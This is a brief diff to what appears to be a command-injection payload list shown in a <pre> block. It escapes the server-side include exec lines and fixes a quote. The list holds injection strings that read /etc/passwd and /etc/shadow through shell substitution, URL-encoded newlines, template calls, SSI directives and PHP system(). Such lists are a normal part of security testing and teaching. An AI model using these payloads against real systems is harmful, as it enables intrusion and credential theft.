@@ -97,9 +97,10 @@ $(`cat /etc/passwd`)
 cat /etc/passwd
 %0Acat%20/etc/passwd
 {{ get_user_file("/etc/passwd") }}
-<!--#exec cmd="/bin/cat /etc/passwd"-->
-<!--#exec cmd="/bin/cat /etc/shadow"-->
-<!--#exec cmd="/usr/bin/id;-->
+&lt; !--#exec cmd="/bin/cat /etc/passwd"--&gt;
+&lt; !--#exec cmd="/bin/cat /etc/shadow"--&gt;
+&lt; !--#exec cmd="/usr/bin/id;"--&gt;
 system('cat /etc/passwd');
 <?php system("cat /etc/passwd");?>
 </pre>
+
